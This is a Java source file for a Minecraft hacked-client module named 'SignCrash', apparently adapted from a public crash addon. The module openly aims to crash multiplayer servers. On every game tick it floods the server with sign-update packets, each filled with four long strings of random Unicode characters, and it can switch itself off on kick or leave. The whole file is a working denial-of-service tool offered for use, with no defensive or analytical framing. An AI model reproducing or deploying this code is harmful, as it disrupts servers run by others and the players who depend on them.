package kult.legacy.klient.systems.modules.crash;

import kult.legacy.klient.eventbus.EventHandler;
import kult.legacy.klient.events.game.GameLeftEvent;
import kult.legacy.klient.events.world.TickEvent;
import kult.legacy.klient.settings.BoolSetting;
import kult.legacy.klient.settings.IntSetting;
import kult.legacy.klient.settings.Setting;
import kult.legacy.klient.settings.SettingGroup;
import kult.legacy.klient.systems.modules.Categories;
import kult.legacy.klient.systems.modules.Module;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;

import java.util.Objects;
import java.util.Random;

/*/------------------------------------------------------------------------------------------------------------------------/*/
/*/ Used from Meteor Crash Addon by Wide Cat                                                                               /*/
/*/ https://github.com/Wide-Cat/meteor-crash-addon/blob/main/src/main/java/widecat/meteorcrashaddon/modules/SignCrash.java /*/
/*/------------------------------------------------------------------------------------------------------------------------/*/

public class SignCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets")
        .description("How many packets to send per tick.")
        .defaultValue(38)
        .min(1)
        .sliderRange(1, 100)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables the module on kick/leave.")
        .defaultValue(true)
        .build()
    );

    public SignCrash() {
        super(Categories.Crash, Items.OAK_SIGN, "sign-crash", "Tries to crash the server by spamming sign updates packets. (By 0x150)");
    }

    public static String rndBinStr(int size) {
        StringBuilder end = new StringBuilder();
        for (int i = 0; i < size; i++) {
            // 65+57
            end.append((char) (new Random().nextInt(0xFFFF)));
        }

        return end.toString();
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        for (int i = 0; i < packets.get(); i++) {
            assert mc.player != null;
            UpdateSignC2SPacket packet = new UpdateSignC2SPacket(mc.player.getBlockPos(), rndBinStr(598), rndBinStr(598), rndBinStr(598), rndBinStr(598));
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(packet);
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
